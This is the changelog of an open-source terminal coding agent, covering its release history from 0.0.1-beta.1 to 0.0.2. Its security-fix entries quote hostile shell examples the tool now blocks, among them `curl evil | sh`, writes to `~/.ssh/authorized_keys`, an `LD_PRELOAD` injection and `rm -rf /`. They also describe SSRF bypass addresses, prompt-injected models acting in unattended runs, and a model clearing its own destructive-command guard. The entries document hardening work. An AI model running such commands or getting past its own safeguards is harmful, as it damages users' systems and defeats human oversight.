# Changelog

## 0.0.2

- Added a `memory` tool — agent-writable, project-scoped notes that persist across sessions: the `MEMORY.md` index is re-injected into context each session, other notes load on demand. Sandboxed to a flat per-project store, auto-approved interactively, and disabled in headless runs.
- Added Claude Code / Codex-style composer prefixes: `@<path>` attaches a file via a gitignore-aware typeahead, `!<command>` runs a shell command inline without a model turn (`!!` forces past the danger guard), and `#<note>` appends to the project `CLAUDE.md`.
- Added left-drag text selection in the TUI — drag to highlight and copy on release (no Shift needed); handles wide CJK/emoji characters and clears on the next key, scroll, or click.
- `/help` now documents composer history recall (↑/↓ on the first/last line) and the new left-drag selection.
- Added automatic, provider-agnostic model failover: when the active model is rate-limited or overloaded, the turn switches to the next model in `fallback_models` and continues. Off by default; never fails over mid-stream or to a provider you aren't signed in to.
- `/cost` is now accurate and per-model: spend is tallied per model and split by billing class (input, output, cache read, cache write), Anthropic models are priced from their own rates, and the tally survives `/resume`.
- Added project-scoped config: a `.opencli/config.json` overrides global `config.json` for that project. Only safe fields are honored (`model`, `reasoning_effort`, `verbosity`, `auto_compact`, `fallback_models`); security keys are ignored, so a cloned repo can't disable approvals or redirect the model.
- Added `opencli-website/` — the marketing & docs site (static Next.js), auto-deployed to Vercel at https://opencli-website.vercel.app.
- Rebuilt `/context` as a visual context-window breakdown (Claude Code style): a colored proportional grid and per-category legend (system prompt, tool schemas, agents, memory, skills, conversation) with token estimates, plus MCP/agent/memory/skill detail. `/context all` expands the lists.
- Tool-call errors are now self-correcting: when a tool's arguments fail to parse (wrong type, missing field, invalid JSON), the result appends a compact summary of that tool's expected arguments so the model fixes the call within the same turn instead of guessing. Provider-agnostic — works with every model.
- A call to a misspelled or non-existent tool now suggests the closest real tool name (`Did you mean: \`read_file\`?`) instead of a bare "unknown tool", so the model recovers within the same turn. Suggestions use edit distance and only fire on a genuinely close match.
- A headless (non-interactive) run that blocks a side-effecting tool now steers the model to a read-only tool (`read_file`/`list_dir`/`grep`/`glob`) so a read-only goal still completes, instead of dead-ending on "denied". The operator hint to re-run with `--dangerously-skip-permissions` is kept.
- Added `opencli doctor` and `/doctor` — a read-only setup health check covering auth (incl. `auth.json` `0600` perms), config, model-vs-credential routing, MCP servers, and external tools (`git`/`ripgrep`/`grep`). Runs headless and exits non-zero on failure.
- Headless `chat`/`run` is now read-only by default: side-effecting tools (`run_shell`, file writes, MCP, `dispatch_agent`) are denied instead of auto-running, so a prompt-injected model can't take actions in an unattended run. Pass `--dangerously-skip-permissions` to allow them. The interactive TUI is unchanged.
- Fixed `run_shell`'s destructive-command guard being clearable by the model itself: the `dangerous_override` argument is now ignored in non-interactive runs, so an injected model can't wave `rm -rf`/`git reset --hard` past it.
- Fixed `run_shell` allow rules being bypassable by redirection or an env prefix — a saved `echo:*` grant no longer auto-runs `echo … > ~/.ssh/authorized_keys`, and `LD_PRELOAD=…/evil.so cargo test` no longer rides a `cargo:*` grant. Both now prompt instead.
- Fixed `run_shell` deny rules missing a program hidden in a loop/conditional body, e.g. `for f in *; do rm -rf $f; done` slipping past `deny(rm:*)`.
- The environment scrub before each `run_shell` now also removes the live `ssh-agent`/`gpg-agent` sockets (`SSH_AUTH_SOCK`), `KUBECONFIG`, `DOCKER_AUTH_CONFIG`, `NETRC`, and `*PASSPHRASE*` vars, so a spawned shell can't reuse those credentials.
- Fixed custom OpenAI-compatible providers leaking the API key when a gateway echoes the `Authorization` header in an error — error bodies are now auth-redacted, like the built-in OpenAI/Anthropic clients.
- Selecting an OpenAI model a ChatGPT/Codex subscription rejects (e.g. `gpt-5.4-mini`, a `-pro`, `gpt-5.2`, `gpt-5`) now fails fast naming the supported models, instead of a raw 400 mid-turn. API-key sign-ins keep the full catalogue.
- Saving an "allow in this project" rule now rejects a symlinked `.opencli` dir/file and writes the file `O_NOFOLLOW` owner-only, so a project symlink can't redirect the allow-list.
- Headless `chat` output now strips terminal control sequences from untrusted model/tool text, so a payload can't rewrite the terminal, set the title, inject clipboard data, or corrupt the display.
- `/export` Markdown now uses fences longer than any backtick run in the transcript, so embedded code fences no longer break the exported document.
- OpenAI/Anthropic response-parse and malformed-SSE errors now include bounded, auth-redacted excerpts instead of raw bodies that could contain keys or huge payloads.
- Non-Unix auth now fails with a clear unsupported-platform error rather than storing tokens with inherited ACLs when owner-only file permissions can't be enforced.
- `!`-commands now run on a background task with a 120s timeout, so a long-running command (dev server, `tail -f`) no longer freezes the TUI.
- `@<path>` mentions are now confined to the workspace — an absolute path, `..` escape, or out-of-`cwd` symlink is ignored instead of attaching out-of-tree files.
- `@`-expansion now scans only your prompt, not the output of a prior `!`-command, so a `@token` printed by a shell command can't attach an unrelated file.
- The `@`-file picker streams `rg --files` and stops after 5000 entries, so opening it in a huge monorepo can't stall the UI.
- A `#<note>` added to a `CLAUDE.md` without a trailing newline now starts on its own line instead of gluing onto the last one.
- `!` and `#` typed while a turn is streaming are now queued and dispatched when it finishes, instead of being sent to the model as literal text.
- Fixed a deadlock where picking a session in the resume picker (or `/undo`) mid-stream froze the UI; such operations now wait for the turn to finish.
- `run_shell` permission rules now consider the whole command, not just the first word: `deny(rm:*)` still blocks `sudo rm`/`x; rm -rf /`/`find . | rm`, and `allow(cargo:*)` no longer auto-runs `cargo build; curl evil | sh`.
- `run_shell` deny rules are harder to bypass — quoted names (`"rm"`), wrappers (`sudo -u root rm`, `timeout 5 rm`), command substitution, backticks, and subshells now still hit `deny(rm:*)`.
- Path-glob permission rules now normalize the path first, so `deny(.git/**)` can't be slipped past by `./.git/config`, `.git//config`, or `.git/x/../config`.
- A malformed path-glob rule can no longer hang the agent: runs of `*` (`***`) are collapsed to `**`, eliminating the `O(n^k)` backtracking a crafted `.opencli/permissions.json` could trigger.
- Project `.opencli/permissions.json` can no longer *grant* permissions — only `deny` is honored, so a cloned repo can tighten but never pre-approve tool execution. Your own "allow" choices now persist in an owner-only store outside the repo.
- `run_shell` deny rules now also catch brace groups (`{ rm -rf /; }`) and glued redirections (`curl>out`, `rm<x`).
- The `run_shell` env scrub now also strips `DATABASE_URL`, bare `*_KEY`, `*_PWD`, `*_DSN`, and `*WEBHOOK*` variables — credential names the previous `*_TOKEN`/`API_KEY` list missed.
- `/cost` no longer overstates OpenAI spend: cached input tokens are now billed at the cache-read rate instead of full input rate, matching Anthropic.
- Fixed a deadlock where a hook that printed before reading stdin could hang the agent (PostToolUse payloads can exceed the pipe buffer); hook output is now drained first and the write is timeout-bounded.
- A foreground `run_shell` that leaves a backgrounded process holding the stdout pipe (`cmd &`) is now bounded by its timeout instead of hanging; on timeout the whole process group is killed.
- Background shells (`run_shell` with `run_in_background`) are now killed when the session ends instead of leaking as orphans.
- `notebook_edit` now requires the notebook to be read this session and unchanged on disk (like `edit_file`), and `delete` no longer treats a numeric `cell_id` as a position and deletes the wrong cell.
- A future, uncatalogued Opus/Sonnet model now inherits the 1M context window via version-gating instead of being capped at 200K and auto-compacting too early.
- Context-warning and auto-compact thresholds now handle extreme token counts safely, so a malformed `usage` payload can't crash debug builds or miss the warning.
- Manual Anthropic OAuth login now verifies the `state` in the pasted `code#state`, restoring CSRF/code-injection protection (it was generated but never checked).
- An OpenAI response that stops with `finish_reason: content_filter` now surfaces as an error instead of a silent empty turn.
- The `Retry-After` header is now honored in HTTP-date form as well as delta-seconds.
- Retry backoff now adds jitter so concurrent requests (e.g. sub-agents) hitting an overload don't all retry in lockstep.
- Non-streaming model calls (e.g. compaction) now have a 300s total timeout, so a server that connects then never responds can't hang a turn forever.
- The config dir holding `auth.json`/`config.json` is now created `0o700` (and tightened if looser), so other local users can't list it or read login timestamps.
- Pasting a large block into the composer no longer briefly freezes — the text is inserted in one operation instead of character-by-character (O(n²)).
- Clicking in the input area no longer toggles an off-screen sub-agent; only rows actually drawn register click targets.
- Anthropic `redacted_thinking` blocks are no longer dropped: their opaque data is captured and replayed before the turn's tool call, so a redacted-thinking-then-tool turn isn't rejected on the next request.
- An Anthropic response that stops with `stop_reason: refusal` now surfaces as an error instead of a silent empty turn, matching the OpenAI `content_filter` handling.
- The `login` API-key prompt now ignores key-release/repeat events (no doubled keys on Windows/kitty) and restores cooked-mode terminal via an RAII guard, so a panic can't leave echo off.
- The `web_fetch` SSRF guard now also blocks IPv6 literals embedding an internal IPv4 via IPv4-compatible (`::127.0.0.1`) or NAT64 (`64:ff9b::7f00:1`) prefixes, not just IPv4-mapped.
- `web_fetch` now pins the exact DNS addresses that passed the SSRF check, so a hostile DNS server can't validate with a public address then connect to a private one.
- Web-search response bodies are now capped at 8 MiB while streaming, so a bad backend can't grow memory without bound.
- MCP server messages are now capped at 16 MiB per JSON-RPC line, so a malicious MCP subprocess can't exhaust memory with one newline-less response.
- Fixed a possible `usize` underflow panic in the `/buddy` pet roll when a rarity tier has no species — it now falls back to the first pet.
- Pressing Esc on the ChatGPT OAuth "waiting for browser" screen now cancels the login, so a late browser callback can't flip it to success or overwrite a new flow.
- Tool-argument stream buffers are now bounded by aggregate size (16 MiB), not just count and per-buffer size, so a malformed stream can't pin hundreds of MiB; the args-`done` path is covered too.
- The danger guard now flags a redirect to a raw block device when glued to the target (`echo x >/dev/sda`), not only when spaced; reading a device (`cat /dev/sda`) is still allowed.
- Removed the unused `keyring` dependency (vendored C lib + D-Bus stack, no code references) — smaller build and attack surface; credentials stay in `auth.json` with `0o600` perms.
- A Claude-family model whose id can't be parsed now defaults to the adaptive thinking shape instead of having thinking silently disabled. Non-Claude providers are unaffected.
- OpenAI reasoning-effort normalization now pins every `-pro` model to `high`, not just `gpt-5-pro` — `gpt-5.5-pro` and future pro tiers were missing the clamp.
- The OpenAI model list now matches the current API (`gpt-5.5`/`-pro`, `gpt-5.4`/`-mini`/`-nano`, `gpt-5.2`, `gpt-5`); removed ids auto-migrate to their closest equivalent on startup, and real models `gpt-5`/`gpt-5.2` are no longer force-migrated to the default.
- Reorganized the codebase so every Rust source file is ≤500 lines: large modules (`agent`, `tui/app`, `tui/ui`, the `tools` set, `openai/chat`, `permissions`) are split into focused submodules and two oversized functions are decomposed. Pure internal refactor — no behavior change, same 731 tests pass.
- `run_shell`'s danger guard now flags git's wider destructive surface — force-push via a `+refspec`/`--mirror`, remote-branch deletion (`push :branch`/`--delete`), `branch -D`, `update-ref -d`, `reflog expire`, `gc --prune=now`, `stash clear/drop`, and `filter-branch` — so none can auto-run unseen under a `git:*` allow rule.

## 0.0.1-beta.4

Beta 4 focuses on making long agent sessions easier to run, inspect, and recover: better context/quota visibility, safer file and shell behavior, more Claude Code-compatible tools, and release-ready TUI polish.

### Highlights

- Added daemon-free code intelligence with the `lsp` tool: document/workspace symbols, go-to-definition, references, and hover for Rust, TypeScript/JavaScript, Python, and Go.
- Added isolated git worktrees through `enter_worktree`/`exit_worktree` plus `/worktree create [name]` and `/worktree exit keep|remove [--discard]` in the TUI.
- Added `/usage` for live provider quota/rate-limit status, separate from `/cost`'s local token tally and USD estimate.
- Added `/context` (`/ctx`) to show real context-window usage plus a rough breakdown of where the visible conversation is spending tokens.
- Added `tool_search` for progressive MCP tool disclosure when many MCP tools are connected, reducing per-request schema bloat.

### New tools and commands

- Added `wait`, a non-blocking 1–120s sleep for poll-and-wait loops that does not occupy a foreground shell slot.
- Added task dependencies to `todo_write` with `id` and `blockedBy`, including unblocked-task summaries and dimmed blocked items in the live todo panel.
- Added stale-file guards to `edit_file`, `multi_edit`, and `write_file` so writes are refused when the file changed after the model last read it.
- Added `/commit` and `/commit-push-pr` slash commands with a git safety protocol, Conventional Commit generation, optional branch push, and PR creation via `gh`.
- Added `opencli run` as an alias for headless `chat`, plus `--cwd` and `--prompt-file` for cron/systemd-style scheduled runs.
- Added `/buddy`, a pixel-art companion that hatches from an egg and then sits small in the bottom-right of the chat. The species is a rarity-weighted roll (common→legendary) seeded deterministically from the signed-in account, so it's stable for an account and only re-rolls on an account switch — and because it's derived purely (nothing stored), clearing local state can't change it. `/buddy off` hides it, `/buddy reset` re-hatches, and `OPENCLI_BUDDY_DEV` / `OPENCLI_BUDDY_SEED` are dev overrides.

### Reliability and recovery

- Hardened OpenAI Responses, OpenAI Chat Completions, and Anthropic streaming against early SSE connection drops. Pre-output drops retry the turn; drops after usable text or a completed tool call finalize the streamed work, while incomplete tool calls are skipped instead of executing partial arguments.
- Captured provider quota from response headers and Codex `codex.rate_limits` events without extra API calls, covering ChatGPT/Codex OAuth, OpenAI API keys, Claude OAuth, and Anthropic API keys.
- Increased `dispatch_agent`'s outer hard timeout independently of ordinary tools, so long repo-audit subagents are not cut off by the default per-tool cap.
- Kept deferred MCP tools available after working-directory changes mid-session.
- Removed the staging temp file when an atomic file write fails after the temp is created (partial write, permission error, or cross-device/EISDIR rename), so failed `write_file`/`edit_file`/`multi_edit` operations no longer leave stray `.tmp` siblings behind.
- Stopped the `lsp` workspace-symbol walk from following directory symlinks and capped its recursion depth, so a symlink cycle in the project tree can no longer recurse until the stack overflows.
- Bounded `grep` stdout capture at ~4 MiB and killed the search process on overrun, so a pattern matching every line of a giant minified file can no longer balloon memory before the output cap trims it.
- Showed both consumed and remaining quota in `/usage` (`12.5% used (87.5% left)`), so a percentage reads unambiguously whether the provider's native UI counts up (Claude utilization) or down (ChatGPT/Codex remaining). All providers are still normalized to one "used" convention internally; this only clarifies the display.
- Capped the per-stream tool-call and content-block accumulators (orphan argument buffers in the Responses path, Anthropic content blocks, and Chat Completions tool calls), so a malformed stream emitting unboundedly many distinct ids/indices can no longer grow memory during a single turn.
- Bounded the in-memory composer recall history (Up/Down) at 1000 entries so a multi-day session can't grow it without limit.
- Fsync the staging session file before the atomic rename on every platform (previously Unix-only), so a crash mid-save can no longer leave a renamed-but-unflushed empty/partial session, and unified the per-platform write paths into one.

### Safety and security

- Hardened `dispatch_agent` cwd overrides: child cwd values are canonicalized and must stay under the parent session cwd.
- Hardened `run_shell` destructive-command detection for absolute program paths such as `/bin/rm`, `/usr/bin/git`, `/sbin/mkfs.*`, and `/usr/bin/curl | /bin/sh`.
- Wrote `config.json` with owner-only permissions on Unix and redacted provider API keys from `config --show`.
- Preserved sub-agent approval safety: when nested approvals cannot be surfaced, sub-agents run in enforced plan mode rather than silently bypassing review.

### TUI polish and fixes

- Improved `run_shell` rendering to match Claude Code more closely: red stderr, no separator box, compact `Error (exit N)` footer, and more failed-command output kept inline.
- Fixed long-session TUI garbling by sanitizing ANSI codes, tabs, and carriage returns before rendering tool output.
- Fixed a plan-approval lockout where typing a follow-up while the agent was planning could make `Y` stop approving the plan.
- Updated README and in-app slash command discovery for the beta4 release line and `/usage`.

### Claude Code and Codex interoperability

- Expanded inherited memory loading to include global instruction files from `$CODEX_HOME` / `~/.codex`, `~/.claude`, and `~/.config/opencli`, then the git repository root through the session `cwd` (ancestor-first, closest directory last in the prompt).
- Fixed inherited memory to match Codex-style discovery: at most one file per directory (`AGENTS.override.md` > `AGENTS.md` > `CLAUDE.md`), stop at the git root instead of the filesystem root, cap combined bodies at 32 KiB, and replace the previous memory block on re-apply instead of duplicating it. Fixed candidate-file iteration so a missing `AGENTS.override.md` no longer prevented falling through to `AGENTS.md` / `CLAUDE.md`.
- Extended skill discovery to project `.codex/skills/`, `$CODEX_HOME/skills` / `~/.codex/skills`, and recursive search under Claude/Codex `plugins/` trees (deduplicated roots).
- Extended sub-agent discovery to project `.codex/agents/`, `~/.codex/agents`, and `$CODEX_HOME/agents` (deduplicated roots).
- Updated `dispatch_agent` tool copy, the default system prompt, and TUI `/agents` / `/skills` empty-state messages to document the expanded discovery paths.
- Added tests for git-scoped walk-up ordering, `AGENTS.override.md` precedence, repo-boundary exclusion, idempotent re-apply, the 32 KiB cap, and Codex/plugin skill and sub-agent roots.

## 0.0.1-beta.3

Stability beta adding proactive context management and hardening streamed tool calls, reasoning portability, and `/goal` limits.

- Added proactive context "microcompaction": when the last request crosses ~75% of the context window, stale already-seen tool-output bulk is shed before the next request (keeping every message and reasoning block intact) — far cheaper and less lossy than a full `/compact`. Scoped to the history the model has already been shown, so a large parallel tool batch's fresh results are never dropped before it reads them.
- Added automatic recovery from a hard context-window overflow: shed stale tool outputs and retry the turn (bounded) instead of failing, covering both a pre-stream rejection and an overflow surfaced as an error mid-stream.
- Tracked context occupancy from provider-reported usage and stopped a failed or usage-less response from zeroing it (which had silently disabled proactive microcompaction on the next turn).
- Fixed streamed tool-call arguments dropping a bare `null`/`{}`/`[]` value mid-object (e.g. a streamed `"limit": null`), which corrupted the accumulated JSON; the leading empty-args placeholder rule now lives in one shared helper across the OpenAI Responses, Chat Completions, and Anthropic paths so they can't drift.
- Added the `forward_reasoning_effort` provider option to forward reasoning effort to OpenAI-compatible Chat Completions endpoints (off by default; `minimal`/`low`/`medium`/`high` pass through, `xhigh`/`max`/`ultracode` clamp to `high`, unknown levels omitted to avoid 400s).
- Dropped provider-foreign reasoning/thinking items before the OpenAI Responses wire, so a `/model` switch or a resumed cross-provider session no longer 400s on a foreign reasoning id.
- Added `OPENCLI_DEBUG_WIRE=1` opt-in wire diagnostics to confirm the reasoning effort and token usage actually sent to the provider.
- Bounded `/goal` objectives by both word and character count, so an overlong objective — including space-free CJK text — can't crowd out the real work on every continuation turn.
- Returned a clear "file not found" error from `read_file` instead of leaking the underlying `stat` syscall name.

## 0.0.1-beta.2

Stability beta focused on tool-call compatibility, goal recovery, and credential/model correctness.

- Fixed OpenAI strict tool schemas so `dispatch_agent` and optional tool fields satisfy required/nullable schema rules.
- Hardened OpenAI Chat Completions, OpenAI Responses, and Anthropic stream parsing across text, reasoning, and tool-call delta aliases.
- Limited ChatGPT/Codex OAuth model catalogues to verified OAuth-backed models while keeping full OpenAI catalogues for API-key mode.
- Added credential coverage reporting for OpenAI OAuth/API key and Anthropic OAuth/API key without exposing secrets.
- Preserved OAuth credentials when saving API keys, so multiple credential types can coexist and active mode can switch cleanly.
- Normalized `provider/model` config inputs consistently across config, chat, and TUI slash commands.
- Paused active `/goal` runs on provider/tool errors instead of silently continuing from a broken turn.
- Kept JSON chat output clean by suppressing stderr tracing in `json` and `stream-json` modes.
- Added local release packaging/smoke scripts, CI smoke coverage, and release artifact checksums for repeatable beta verification.

## 0.0.1-beta.1

Initial beta release candidate.

- Added the interactive TUI, headless chat, login/status/config/resume flows, and session persistence.
- Added `/goal` with active-goal continuation, replacement confirmation, footer elapsed timer, and `goal_update`.
- Added Claude-style todo UI and `todo_write` compatibility.
- Added plan-mode controls (`enter_plan_mode`, `exit_plan_mode`) with approval gating.
- Added sub-agent dispatch compatible with Claude Code agent definitions and common Task/Agent argument aliases.
- Hardened tool calling across provider shapes, streamed argument recovery, output caps, parallel read-only calls, and common schema aliases.
- Added filesystem/search/shell/web/notebook tools with undo, permission checks, hook matching, and safer destructive command handling.
- Added OpenAI and Anthropic provider adapters, model catalog handling, retry behavior, and reasoning/thinking translation support.
- Added CI for Linux, macOS, and Windows plus release artifact builds.
